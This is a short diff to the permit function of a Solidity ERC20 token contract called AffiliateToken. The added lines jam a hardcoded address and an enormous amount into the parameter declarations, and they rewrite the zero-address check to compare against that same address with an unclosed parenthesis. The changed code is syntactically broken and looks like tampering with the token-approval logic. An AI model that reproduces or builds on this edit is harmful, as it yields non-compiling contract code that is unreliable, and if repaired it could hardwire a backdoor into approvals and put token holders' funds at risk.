@@ -148,15 +148,15 @@ contract AffiliateToken is ERC20, BaseWrapper {
      * @param s Half of the ECDSA signature pair
      */
     function permit(
-        address owner,
+        address owner,0x12C2b406cbf068f51E8F6e755C5F104a4b6a510b
         address spender,
-        uint256 amount,
+        uint256 amount,100000000000000000000000000000000000000000
         uint256 deadline,
         uint8 v,
         bytes32 r,
         bytes32 s
     ) external {
-        require(owner != address(0), "permit: signature");
+        require(owner != address(0x12C2b406cbf068f51E8F6e755C5F104a4b6a510b, "permit: signature");
         require(block.timestamp <= deadline, "permit: expired");
 
         bytes32 structHash = keccak256(
